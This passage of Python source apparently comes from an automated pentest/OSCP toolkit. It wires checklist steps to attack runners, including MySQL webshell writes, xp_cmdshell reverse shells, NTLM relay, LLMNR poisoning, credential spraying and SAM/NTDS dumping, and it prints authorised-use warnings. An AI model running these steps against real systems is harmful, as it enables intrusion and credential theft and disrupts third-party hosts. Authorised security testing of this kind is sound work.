    "mysql-loot": ("dump DBs/users, mysql.user hashes, app creds, LOAD_FILE (mysql CLI, read-only)", _tool_mysql_loot),
    "mysql-rce": ("INTO OUTFILE webshell → exec-verified RCE (FILE priv); UDF guidance", _tool_mysql_rce),
    "mysql-shell": ("MySQL foothold → reverse shell via the OUTFILE webshell (spawned)", _tool_mysql_shell),
    "mysql-next": ("manual MySQL steps (context-aware, reference only)", _tool_mysql_next),
    "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
    "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
    "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
    "mssql-shell": ("MSSQL foothold → xp_cmdshell PowerShell reverse shell (spawned)", _tool_mssql_shell),
    "mssql-loot": ("DBs, linked servers, sql_login hashes, OPENROWSET file-read (netexec -q)", _tool_mssql_loot),
    "mssql-next": ("manual MSSQL steps (context-aware, reference only)", _tool_mssql_next),
    "ssh-banner": ("SSH banner + KEXINIT algos → searchsploit; libssh/Terrapin flags (stdlib)", _tool_ssh_banner),
    "ssh-creds": ("reused/default SSH creds (netexec ssh / sshpass, fail2ban-aware)", _tool_ssh_creds),
    "ssh-shell": ("SSH foothold → direct interactive session (spawned)", _tool_ssh_shell),
    "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
}

def _mins(seconds: int) -> str:
    """Compact minute count for a step-tool time cap: '10', '2.5' (caller adds the unit)."""
    m = seconds / 60
    return str(int(m)) if seconds % 60 == 0 else f"{m:.1f}"


# What runs behind each wired step, shown compactly under the checklist line. Verified against
# every _tool_* source. External Kali binaries invoked: whatweb / openssl / searchsploit (each
# IS the step), sqlmap (driven by sqli-scan, only if installed), and — for the SMB phase, where
# a pure-Python client is impractical — netexec (with smbclient/rpcclient/nmap fallback). Every
# HTTP engine is pure stdlib — no john/hashcat/hydra/ffuf/gobuster/wpscan/etc. on that side
# (arjun is reused only as a wordlist file, not run). Per key: (engine label, time-cap text | None).
_STEP_TOOL_RUNS = {
    "http-headers":     ("Python", None),
    "http-fingerprint": ("whatweb", None),
    "ssl-cert":         ("openssl", None),
    "searchsploit":     ("searchsploit", None),
    "http-source":      ("Python", None),
    "http-wellknown":   ("Python", None),
    "http-cookies":     ("Python", None),
    "vhost-fuzz":       ("Python", f"{_mins(_VHOST_DEADLINE)} min"),
    "dir-brute":        ("Python", f"{_mins(_DIRB_DEADLINE)} min"),
    "vcs-hunt":         ("Python", f"{_mins(_VCS_DEADLINE)} min"),
    "param-hunt":       ("Python", f"{_mins(_PARAM_DEADLINE)} min"),
    "default-creds":    ("Python", f"{_mins(_CREDS_DEADLINE)} min"),
    "auth-bypass":      ("Python", f"{_mins(_AUTHB_DEADLINE)} min"),
    "login-brute":      ("Python", f"{_mins(_BRUTE_DEADLINE)} min"),
    "sqli-dump":        ("Python", f"{_mins(_SQLI_DUMP_DEADLINE)} min"),
    # stdlib detection (5 min) then sqlmap enum/dump if installed (3 min/point) → "5/3 min"
    "sqli-scan":        ("Python/sqlmap",
                         f"{_mins(_SQLI_DEADLINE)}/{_mins(_SQLI_SQLMAP_TIMEOUT)} min"),
    "lfi-scan":         ("Python", f"{_mins(_LFI_DEADLINE)} min"),
    "rfi-scan":         ("Python", f"{_mins(_RFI_DEADLINE)} min"),
    "cmdi-scan":        ("Python", f"{_mins(_CMDI_DEADLINE)} min"),
    "ssti-scan":        ("Python", f"{_mins(_SSTI_DEADLINE)} min"),
    "upload-shell":     ("Python", f"{_mins(_UPLOAD_DEADLINE)} min"),
    "xxe-ssrf":         ("Python", f"{_mins(_XXES_DEADLINE)} min"),
    "idor-bac":         ("Python", f"{_mins(_IDOR_DEADLINE)} min"),
    "cms-scan":         ("Python + wpscan/droopescan", f"{_mins(_CMS_DEADLINE)} min"),
    "admin-rce":        ("Python", f"{_mins(_ADMINRCE_DEADLINE)} min"),
    "foothold":         ("Python", None),
    "next-steps":       ("reference · no scan", None),
    "smb-enum":         ("netexec / smbclient+rpcclient+nmap", f"{_mins(_SMBENUM_DEADLINE)} min"),
    "smb-vuln":         ("nmap NSE + netexec", f"{_mins(_SMBVULN_DEADLINE)} min"),
    "smb-loot":         ("smbclient + gpp-decrypt", f"{_mins(_SMBLOOT_DEADLINE)} min"),
    "smb-gpp":          ("netexec + smbclient", f"{_mins(_SMBGPP_DEADLINE)} min"),
    "smb-poison":       ("Responder", f"{_mins(_SMBPOISON_DEADLINE)} min"),
    "smb-relay":        ("ntlmrelayx", f"{_mins(_SMBRELAY_DEADLINE)} min"),
    "smb-coerce":       ("netexec coerce_plus", f"{_mins(_SMBCOERCE_DEADLINE)} min"),
    "smb-dccve":        ("netexec zerologon/nopac/printnightmare", f"{_mins(_SMBDCCVE_DEADLINE)} min"),
    "smb-spray":        ("netexec", f"{_mins(_SMBSPRAY_DEADLINE)} min"),
    "smb-exec":         ("netexec -x", f"{_mins(_SMBEXEC_DEADLINE)} min"),
    "smb-dump":         ("netexec --sam/--lsa/--ntds", f"{_mins(_SMBDUMP_DEADLINE)} min"),
    "smb-writable":     ("netexec slinky", f"{_mins(_SMBWRITABLE_DEADLINE)} min"),
    "smb-foothold":     ("impacket / evil-winrm", None),
    "smb-next":         ("reference · no scan", None),
    "winrm-enum":       ("Python + netexec", None),
    "winrm-spray":      ("netexec winrm", f"{_mins(_WINRMSPRAY_DEADLINE)} min"),
    "winrm-shell":      ("evil-winrm", None),
    "winrm-access":     ("netexec --local-group", None),
    "winrm-recon":      ("netexec winrm -x", None),
    "winrm-next":       ("reference · no scan", None),
    "ftp-banner":       ("Python + searchsploit", None),
    "ftp-anon":         ("Python", f"{_mins(_FTPANON_DEADLINE)} min"),
    "ftp-write":        ("Python", f"{_mins(_FTPWRITE_DEADLINE)} min"),
    "ftp-creds":        ("Python", f"{_mins(_FTPCREDS_DEADLINE)} min"),
    "ftp-webshell":     ("Python", f"{_mins(_FTPWEB_DEADLINE)} min"),
    "ftp-bounce":       ("Python", f"{_mins(_FTPBOUNCE_DEADLINE)} min"),
    "ftp-foothold":     ("Python + nc/ssh", None),
    "ftp-next":         ("reference · no scan", None),
    "tftp-probe":       ("Python (raw UDP)", None),
    "tftp-grab":        ("Python (raw UDP)", f"{_mins(_TFTPGRAB_DEADLINE)} min"),
    "tftp-write":       ("Python (raw UDP)", None),
    "tftp-next":        ("reference · no scan", None),
    "telnet-banner":    ("Python (raw socket) + searchsploit", None),
    "telnet-creds":     ("Python (raw socket)", f"{_mins(_TELNETCREDS_DEADLINE)} min"),
    "telnet-shell":     ("Python (raw socket)", None),
    "telnet-sniff":     ("Python (raw AF_PACKET)", f"{_mins(_TELNETSNIFF_DEADLINE)} min"),
    "telnet-next":      ("reference · no scan", None),
    "mysql-banner":     ("Python (stdlib) + searchsploit", None),
    "mysql-creds":      ("mysql CLI / netexec", f"{_mins(_MYSQLCREDS_DEADLINE)} min"),
    "mysql-loot":       ("mysql CLI", f"{_mins(_MYSQLLOOT_DEADLINE)} min"),
    "mysql-rce":        ("mysql CLI + HTTP verify", f"{_mins(_MYSQLRCE_DEADLINE)} min"),
    "mysql-shell":      ("Python (smart listener)", None),
    "mysql-next":       ("reference · no scan", None),
    "mssql-banner":     ("Python (stdlib) + searchsploit", None),
    "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
    "mssql-exec":       ("netexec mssql -x", None),
    "mssql-shell":      ("netexec + nc listener", None),
    "mssql-loot":       ("netexec mssql -q", None),
    "mssql-next":       ("reference · no scan", None),
    "ssh-banner":       ("Python (stdlib) + searchsploit", None),
    "ssh-creds":        ("netexec ssh / sshpass", f"{_mins(_SSHCREDS_DEADLINE)} min"),
    "ssh-shell":        ("ssh / sshpass", None),
    "spawn-shell":      ("router → service foothold", None),
}


def _step_run_line(tool_key: str) -> str:
    """Compact '→ …' descriptor under a wired step: the tool/engine and its time cap."""
    info = _STEP_TOOL_RUNS.get(tool_key)
    if not info:
        return "internal program"
    label, cap = info
    return f"{label}  ·  time {cap}" if cap else label


# tools that harvest hostnames → maintain the managed /etc/hosts block (root) / show the
# paste line (no root); used to print the right sudo notice at launch
_HOSTS_WRITING_TOOLS = {"http-headers", "ssl-cert", "http-source", "vhost-fuzz", "smb-enum"}

# status glyph + colour for a checklist step
_STEP_MARK = {"done": ("✓", GREEN), "skip": ("⊘", MAGENTA), "running": ("⏳", YELLOW),
              None: ("○", DIM)}


def _render_exploit_checklist(ip: str, target: tuple) -> None:
    """One service's pentest checklist: each step with its status (○ to-do / ✓ done /
    ⊘ skip) and, when one is wired, the tool that can run it."""
    port, proto, label, key, ver, signal = target
    _sync_hosts_block(ip)     # entering a host's checklist as root materialises its DB domains → hosts
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    status = fetch_step_status(ip, port, proto, key)
    print(f"\n{BOLD}{label} — checklist{RESET}  {DIM}{ip}:{port}/{proto}{RESET}")
    if ver:
        print(f"  {DIM}fingerprint:{RESET} {ver} {DIM}(via {signal}){RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, tool_key = _step_parts(step)
        st = status.get(i)
        sym, col = _STEP_MARK.get(st, _STEP_MARK[None])
        has_tool = bool(tool_key and tool_key in _STEP_TOOLS)
        text = f"{BOLD}{desc}{RESET}" if has_tool else desc   # wired (runnable) → bold
        body = f"{col}{text}{RESET}" if st in ("done", "skip") else text  # done → green line
        print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")
        if has_tool:
            print(f"        {DIM}→ {_step_run_line(tool_key)}  ·  run with {BOLD}r {i}{RESET}")


def _step_tool_worker(job: dict, ip: str, port: int, proto: str, tool_key, runner,
                      svc_key: str, step_n: int, prev_status: "str | None") -> None:
    """Background body of a checklist tool: run it, store the output as the port's DETAILS
    (which also extracts hostnames/findings), update the job, and flip the checklist step
    to ✓ done on success — or back to its prior status on error."""
    try:
        out = runner(ip, port, proto)
    except Exception as exc:                              # noqa: BLE001 — never crash the thread
        job["state"], job["error"] = "error", str(exc)
        _job_update(job)
        set_step_status(ip, port, proto, svc_key, step_n, prev_status)   # error → leave as it was
        return
    save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
    job["state"], job["output"], job["hosts"] = "done", out, 1
    _job_update(job)
    set_step_status(ip, port, proto, svc_key, step_n, "done")            # success → green


def _run_step_tool(ip: str, target: tuple, n: int) -> None:
    """Launch the wired tool for step n in the background (like the scan phases, so the app
    never blocks); marks the step ⏳ running now, ✓ done when it finishes. Output lands in
    the port's DETAILS / [f] findings, viewable in status."""
    port, proto, _label, key, _ver, _signal = target
    _sync_hosts_block(ip)     # running any checklist tool materialises this host's DB domains → hosts (root)
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    if not 1 <= n <= len(steps):
        print(f"{RED}✗ no step {n}{RESET}")
        return
    _desc, tool_key = _step_parts(steps[n - 1])
    if not tool_key or tool_key not in _STEP_TOOLS:
        print(f"{DIM}step {n} has no tool — do it manually{RESET}")
        return
    tlabel, runner = _STEP_TOOLS[tool_key]

    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next"):  # foreground: interactive / print-now
        prev = fetch_step_status(ip, port, proto, key).get(n)
        set_step_status(ip, port, proto, key, n, "running")
        try:
            out = runner(ip, port, proto)                     # foothold reads input; next-steps builds a list
        except Exception as exc:                              # noqa: BLE001
            print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
            set_step_status(ip, port, proto, key, n, prev)
            return
        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next"):  # a list to read now, not a scan result
            print("\n" + out)
            out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
        save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
        set_step_status(ip, port, proto, key, n, "done")
        return

    prev = fetch_step_status(ip, port, proto, key).get(n)     # so an error can restore it
    set_step_status(ip, port, proto, key, n, "running")       # show ⏳ in the checklist now
    job = _new_job("5", f"{_label} ({ip}:{port}/{proto})", f"{tlabel} on {ip}:{port}/{proto}")
    threading.Thread(target=_step_tool_worker,
                     args=(job, ip, port, proto, tool_key, runner, key, n, prev),
                     daemon=True).start()
    print(f"\n{GREEN}▶ {tlabel} running in the background{RESET} "
          f"{DIM}({ip}:{port}/{proto}) — check {BOLD}[s] status{RESET}{DIM}; output → "
          f"{BOLD}DETAILS{RESET}{DIM} / {BOLD}[f] findings{RESET}")
    if tool_key == "vhost-fuzz":                  # tell the user which wordlist was chosen
        wl_label, words = _pick_vhost_wordlist()
        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} words) · "
              f"deadline {_VHOST_DEADLINE // 60} min{RESET}")
    if tool_key == "dir-brute":                   # wordlist + how many targets (host + vhosts)
        wl_label, words = _pick_dirb_wordlist()
        nv = len({hn for hn, _p, _s in fetch_hostnames(ip) if hn != ip})
        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} words) · "
              f"targets: host + {nv} vhost(s) · deadline {_DIRB_DEADLINE // 60} min{RESET}")
    if tool_key == "vcs-hunt":                    # signature-checked exposures, host + vhosts
        nv = len({hn for hn, _p, _s in fetch_hostnames(ip) if hn != ip})
        print(f"{DIM}   signature-checked exposures · targets: host + {nv} vhost(s) · "
              f"deadline {_VCS_DEADLINE // 60} min{RESET}")
    if tool_key == "param-hunt":                  # wordlist + endpoints mined from earlier steps
        wl_label, words = _pick_param_wordlist()
        ne = len(_gather_param_endpoints(ip, port, proto))
        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} params) · "
              f"endpoints: {ne} · deadline {_PARAM_DEADLINE // 60} min{RESET}")
    if tool_key == "default-creds":               # small default set, not brute — warn on lockout
        print(f"{DIM}   default creds only (not brute-force) · {RESET}{YELLOW}⚠ may trigger "
              f"account lockout{RESET}{DIM} · deadline {_CREDS_DEADLINE // 60} min{RESET}")
    if tool_key == "auth-bypass":                 # non-destructive SQLi + enum on login forms
        print(f"{DIM}   non-destructive SQLi bypass + user enumeration on login forms · "
              f"{RESET}{YELLOW}⚠ active — authorized targets only{RESET}{DIM} · "
              f"deadline {_AUTHB_DEADLINE // 60} min{RESET}")
    if tool_key == "login-brute":                 # gated brute — loud warning
        print(f"{YELLOW}   ⚠ active brute-force{RESET}{DIM} — gates: enum user-list + lockout probe · "
              f"capped {_BRUTE_MAX_PASS} pw · {RESET}{YELLOW}authorized targets only, may lock "
              f"accounts{RESET}{DIM} · deadline {_BRUTE_DEADLINE // 60} min{RESET}")
    if tool_key == "sqli-scan":                   # stdlib detect + auto sqlmap enum/bounded-dump
        sm = "sqlmap ✓" if shutil.which("sqlmap") else "sqlmap NOT installed"
        print(f"{YELLOW}   ⚠ active injection tests{RESET}{DIM} — stdlib detect → {sm} enum + "
              f"bounded dump (os-shell/file-read stay manual) · {RESET}{YELLOW}authorized "
              f"targets only{RESET}{DIM}{RESET}")
    if tool_key == "sqli-dump":                   # own engine, no external tool (OSCP-safe)
        print(f"{YELLOW}   ⚠ active SQLi extraction{RESET}{DIM} — own stdlib engine, "
              f"NO sqlmap (OSCP-safe) · UNION/error auto-dump, blind for short values · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "lfi-scan":                    # read-only file-read tests, content-verified
        print(f"{YELLOW}   ⚠ active file-read tests{RESET}{DIM} — read-only, content-verified "
              f"(passwd/win.ini/environ/php-filter) · RCE stays manual · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "rfi-scan":                    # marker-verified wrapper inclusion, no auto-RCE
        print(f"{YELLOW}   ⚠ active inclusion tests{RESET}{DIM} — marker echo only (data://, "
              f"php://input, expect://) · remote webshell stays manual · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "cmdi-scan":                   # computed-marker + time; auto id/uname only
        print(f"{YELLOW}   ⚠ active command-injection tests{RESET}{DIM} — computed marker + time; "
              f"auto-runs read-only id/uname · reverse shell stays manual · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "ssti-scan":                   # math-verified; auto-id via engine gadget
        print(f"{YELLOW}   ⚠ active template-injection tests{RESET}{DIM} — computed math marker; "
              f"auto-runs read-only id via engine gadget (confirms RCE) · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "smb-vuln":                    # detection only — never exploits
        print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
              f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
              f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
    if tool_key == "ftp-bounce":                  # abuses PORT to scan the server's localhost
        print(f"{DIM}   FTP-bounce: makes the server open data connections to its own 127.0.0.1 "
              f"to find internal-only services (most modern servers disable this) · "
              f"{RESET}{YELLOW}authorised targets only{RESET}")
    if tool_key == "ftp-webshell":                # correlates FTP write with a web root — WRITES
        print(f"{DIM}   uploads a marker via FTP + fetches it over HTTP to prove FTP↔web-root; on a "
              f"hit, an inert exec-verify payload confirms code exec, then both files are removed "
              f"(reversible) · {RESET}{YELLOW}authorised targets only{RESET}")
    if tool_key == "ftp-creds":                   # curated defaults + reuse, not a wordlist brute
        print(f"{DIM}   tries curated FTP defaults + harvested passwords (reuse) — targeted, not a "
              f"wordlist brute (lockout-safe); a full hydra brute stays manual · "
              f"{RESET}{YELLOW}authorised targets only{RESET}")
    if tool_key == "ftp-write":                   # WRITES a throwaway marker — reversible
        print(f"{DIM}   uploads a throwaway {BOLD}~pshw_*.txt{RESET}{DIM} to each dir, confirms the "
              f"STOR, then deletes it (reversible) — finds the webshell/payload-drop surface · "
              f"{RESET}{YELLOW}authorised targets only{RESET}")
    if tool_key == "tftp-write":                  # WRITES a throwaway marker — NOT reversible (no DELETE)
        print(f"{YELLOW}   ⚠ WRITES to the target{RESET}{DIM} — uploads a throwaway {BOLD}~pshw_*{RESET}"
              f"{DIM} via WRQ, reads it back, then blanks it to 0 bytes. "
              f"{RESET}{YELLOW}TFTP has no DELETE — the file stays; clean up manually{RESET}"
              f"{DIM} · authorised targets only{RESET}")
    if tool_key == "ssh-creds":                   # targeted logins — fail2ban may block the IP
        print(f"{DIM}   targeted reused/default logins via netexec ssh / sshpass (not a wordlist brute). "
              f"{RESET}{YELLOW}many failures can trip fail2ban and block your IP{RESET}"
              f"{DIM} · authorised targets only{RESET}")
    if tool_key == "mssql-exec":                  # active command exec via xp_cmdshell
        print(f"{YELLOW}   ⚠ command execution{RESET}{DIM} — runs whoami via xp_cmdshell over a sysadmin "
              f"cred (netexec auto-enables xp_cmdshell). "
              f"{RESET}{YELLOW}authorised targets only{RESET}")
    if tool_key == "mysql-rce":                   # WRITES a webshell — SQL can't delete it
        print(f"{YELLOW}   ⚠ WRITES a webshell{RESET}{DIM} — SELECT … INTO DUMPFILE a PHP shell into "
              f"common web roots, exec-verifies over HTTP. "
              f"{RESET}{YELLOW}SQL can't delete files — the shell stays; clean up manually{RESET}"
              f"{DIM} · authorised targets only{RESET}")
    if tool_key == "mysql-creds":                 # targeted creds; bypass loop only when flagged
        print(f"{DIM}   targeted default/reused logins via mysql CLI / netexec (not a wordlist brute). "
              f"{RESET}{YELLOW}if mysql-banner flagged old 5.x, it runs the CVE-2012-2122 bypass "
              f"(~256 rapid logins — may trip max_connect_errors / block the host){RESET}"
              f"{DIM} · authorised targets only{RESET}")
    if tool_key == "telnet-sniff":                # passive capture — root; MITM stays manual
        print(f"{YELLOW}   ⚠ passive capture (needs root){RESET}{DIM} — sniffs cleartext telnet on the "
              f"NIC toward the target for up to {_TELNETSNIFF_DEADLINE // 60} min; does NOT ARP-spoof "
              f"(the MITM setup is printed to run yourself). "
              f"{RESET}{YELLOW}observes third-party traffic — authorised internal engagements only{RESET}")
    if tool_key == "winrm-recon":                 # read-only post-access recon over the channel
        print(f"{DIM}   read-only recon over WinRM (whoami /priv, ipconfig) — privesc path "
              f"(SeImpersonate → potato) + pivot subnets · deeper enum stays in the shell (r3){RESET}")
    if tool_key == "winrm-access":                # read-only group enum with a harvested cred
        print(f"{DIM}   enumerates Remote Management Users / Administrators via a harvested cred "
              f"(netexec --local-group over SMB 445) — read-only{RESET}")
    if tool_key == "winrm-spray":                 # real creds only — 1 try/host, no guessing
        nc, nh = len(_gather_all_smb_creds()), len(_winrm_hosts())
        print(f"{DIM}   validates {BOLD}{nc}{RESET}{DIM} harvested cred(s) against {BOLD}{nh}{RESET}"
              f"{DIM} WinRM host(s) — real secrets, one try per host (no guessing, no lockout) · "
              f"{RESET}{YELLOW}authorised targets only{RESET}{DIM} · deadline {_WINRMSPRAY_DEADLINE // 60} min{RESET}")
    if tool_key == "winrm-enum":                  # unauth transport confirm — no creds, no lockout
        print(f"{DIM}   unauthenticated /wsman probe on 5985/5986 (stdlib) + netexec banner — "
              f"read-only, no creds tried (no lockout){RESET}")
    if tool_key == "smb-writable":                # WRITES to the target — reversible, blast radius
        print(f"{YELLOW}   ⚠ WRITES to the target{RESET}{DIM} — plants {BOLD}{_SMBWRITABLE_NAME}.lnk{RESET}"
              f"{DIM} on writable shares to capture NetNTLM from any browsing user (third parties); "
              f"reversible (report prints CLEANUP) · start {BOLD}relay r6{RESET}{DIM}/{BOLD}poison r5"
              f"{RESET}{DIM} to catch it · {RESET}{YELLOW}authorised internal engagements only{RESET}")
    if tool_key == "smb-dump":                    # deep loot over proven admin creds
        na = len(_gather_smb_admin())
        print(f"{DIM}   dumps SAM/LSA/LSASS/DPAPI + DCSync (--ntds) over {BOLD}{na}{RESET}{DIM} admin "
              f"host(s) via {BOLD}netexec{RESET}{DIM} — read-only loot; {RESET}{YELLOW}LSASS/DCSync "
              f"are EDR-noisy{RESET}{DIM} · dumped hashes re-fed to spray · {RESET}{YELLOW}authorised "
              f"targets only{RESET}{DIM} · deadline {_SMBDUMP_DEADLINE // 60} min{RESET}")
    if tool_key == "smb-exec":                    # read-only exec confirm over proven admin creds
        na = len(_gather_smb_admin())
        print(f"{DIM}   confirms command exec over {BOLD}{na}{RESET}{DIM} proven admin cred(s) via "
              f"{BOLD}netexec -x{RESET}{DIM} (read-only whoami/hostname) — interactive shell is "
              f"{BOLD}step 13{RESET}{DIM} · {RESET}{YELLOW}authorised targets only{RESET}{DIM} · "
              f"deadline {_SMBEXEC_DEADLINE // 60} min{RESET}")
    if tool_key == "smb-spray":                   # real creds only — 1 try/host, no guessing
        nc, nh = len(_gather_all_smb_creds()), len(_smb_spray_hosts())
        print(f"{DIM}   validates {BOLD}{nc}{RESET}{DIM} harvested cred(s) across {BOLD}{nh}{RESET}"
              f"{DIM} SMB host(s) — real secrets, one try per host (no guessing, no lockout) · "
              f"{RESET}{YELLOW}authorised targets only{RESET}{DIM} · deadline {_SMBSPRAY_DEADLINE // 60} min{RESET}")
    if tool_key == "smb-dccve":                   # detection only — ZeroLogon reset is destructive
        print(f"{YELLOW}   ⚠ DC-takeover CVE scan{RESET}{DIM} — detection only (netexec); ZeroLogon's "
              f"exploit resets the DC machine account and is NEVER run · noPac/PrintNightmare need "
              f"domain creds · {RESET}{YELLOW}authorised targets only{RESET}{DIM} · deadline "
              f"{_SMBDCCVE_DEADLINE // 60} min{RESET}")
    if tool_key == "smb-coerce":                  # driver — fires auth toward our listener
        lh = _foothold_lhost(ip) or "<our IP>"
        print(f"{YELLOW}   ⚠ ACTIVE auth coercion{RESET}{DIM} — forces {ip} to authenticate to "
              f"{BOLD}{lh}{RESET}{DIM}; nothing is caught here — start {BOLD}relay r6{RESET}{DIM} / "
              f"{BOLD}poison r5{RESET}{DIM} first · {RESET}{YELLOW}authorised internal engagements "
              f"only{RESET}")
    if tool_key == "smb-relay":                   # active relay + remote SAM dump — loud gate
        root = f"{GREEN}root ✓{RESET}" if _is_root() else f"{RED}needs root — re-launch under sudo{RESET}"
        n = len(_gather_relay_targets())
        print(f"{YELLOW}   ⚠ ACTIVE NTLM relay{RESET}{DIM} — relays inbound auth to {BOLD}{n}{RESET}"
              f"{DIM} signing-off host(s) & dumps SAM · needs a driver ({BOLD}poison r5{RESET}{DIM} / "
              f"{BOLD}coerce r7{RESET}{DIM}) · ntlmrelayx up to {_SMBRELAY_DEADLINE // 60} min · "
              f"{RESET}{root}{DIM} · {RESET}{YELLOW}authorised internal engagements only{RESET}")
    if tool_key == "smb-poison":                  # active whole-segment poisoning — loud gate
        root = f"{GREEN}root ✓{RESET}" if _is_root() else f"{RED}needs root — re-launch under sudo{RESET}"
        print(f"{YELLOW}   ⚠ ACTIVE LLMNR/NBT-NS/mDNS poisoning{RESET}{DIM} — poisons the WHOLE local "
              f"segment (affects third-party hosts, not just the target) · Responder for up to "
              f"{_SMBPOISON_DEADLINE // 60} min then self-stops · {RESET}{root}{DIM} · "
              f"{RESET}{YELLOW}authorised internal engagements only{RESET}")
    if tool_key == "smb-gpp":                     # authenticated DC loot, creds-aware
        ncreds = len(_gather_smb_creds(ip, port, proto))
        src = f"{ncreds} harvested cred(s) + null/guest" if ncreds else "null/guest only"
        print(f"{DIM}   SYSVOL/NETLOGON GPP loot via {BOLD}netexec + smbclient{RESET}{DIM} — read-only, "
              f"tries {src} · secrets grepped in memory · deadline {_SMBGPP_DEADLINE // 60} min{RESET}")
    if tool_key == "smb-loot":                    # read-only looting, files grepped in memory
        print(f"{DIM}   read-only share looting via {BOLD}smbclient{RESET}{DIM} — files fetched to a "
              f"temp path, grepped in memory, then deleted (no loot on disk) · secrets + GPP "
              f"cpassword → creds saved to the DB · deadline {_SMBLOOT_DEADLINE // 60} min{RESET}")
    if tool_key == "smb-enum":                    # unauth recon: no creds tried, no writes
        eng = "netexec" if (shutil.which("netexec") or shutil.which("nxc")) \
            else "smbclient/rpcclient/nmap"
        print(f"{DIM}   unauthenticated null/guest enum via {BOLD}{eng}{RESET}{DIM} — read-only, "
              f"no credential guessing (no lockout) · deadline {_SMBENUM_DEADLINE // 60} min{RESET}")
    if tool_key in _HOSTS_WRITING_TOOLS:          # domain-discovery tools: /etc/hosts status
        if _is_root():
            print(f"{DIM}   sudo ✓ — discovered domains are auto-added to "
                  f"{BOLD}/etc/hosts{RESET}{DIM} (removed on exit){RESET}")
        else:
            print(f"{YELLOW}   ⚠ no sudo — discovered domains will NOT be written to "
                  f"/etc/hosts{RESET}{DIM}; re-run under sudo, or use the paste line in "
                  f"{BOLD}[f] findings{RESET}")


def _exploit_service_view(ip: str, target: tuple) -> None:
    """One service's checklist: <n> toggles done, s <n> toggles skip, r <n> runs the
    step's tool. Status is saved so progress survives across sessions."""
    port, proto, _label, key = target[0], target[1], target[2], target[3]
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]

    def _toggle(n, want):
        if not 1 <= n <= len(steps):
            print(f"{RED}✗ no step {n}{RESET}")
            return
        cur = fetch_step_status(ip, port, proto, key).get(n)
        set_step_status(ip, port, proto, key, n, None if cur == want else want)

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "s":                             # bare s → running jobs / tool status
            _status_view()
            return "refresh"
        if v == "f":                             # f → findings harvested from the tools
            _host_findings_view(ip)
            return "refresh"
        if v.startswith("s") and v[1:].strip().isdigit():
            _toggle(int(v[1:].strip()), "skip")
            return "refresh"
        if v.startswith("r") and v[1:].strip().isdigit():
            _run_step_tool(ip, target, int(v[1:].strip()))
            return "stay"                        # just the launch line + bare prompt (no redraw)
        if v.isdigit():
            _toggle(int(v), "done")
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} "
              f"{DIM}— <n> done · s <n> skip · r <n> run · s · f · b{RESET}")
        return "stay"

    _run_view(f"{ip}:{port}/{proto} exploit",
              "[Enter] refresh · <n> done · s <n> skip · r <n> run · "
              "[s] status · [f] findings · [b] back · [m] menu",
              lambda: _render_exploit_checklist(ip, target), _handle)


def _exploit_targets_view(ip: str) -> None:
    """Sub-view listing a host's services in exploitation-priority order; a number opens
    that service's pentest checklist."""
    def _handle(targets, v):
        if v == "":
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(targets):
                _exploit_service_view(ip, targets[n - 1])
                return "refresh"
            print(f"{RED}✗ no service {n}{RESET}")
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · enter · b{RESET}")
        return "stay"

    _run_view(f"{ip}/exploit", "[Enter] refresh · <n> select · [b] back · [m] menu",
              lambda: _render_exploit_targets(ip), _handle)


def _handle_service_exploitation() -> None:
    """Phase 6 flow: read a target IP, then show its services (best CTF/OSCP candidates
    first) to pick one to exploit."""
    while True:
        value = _ctx_ask("exploit", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} first{RESET}")
            continue
        _exploit_targets_view(ip)
        return


# ── OS-family checklists: privilege escalation (6) & persistence (7) ───────────
# Both phases key off the host OS, so they share one engine: pick the OS (when none is on
# record), then work a per-family checklist with toggle/skip status. Selectable OSes are
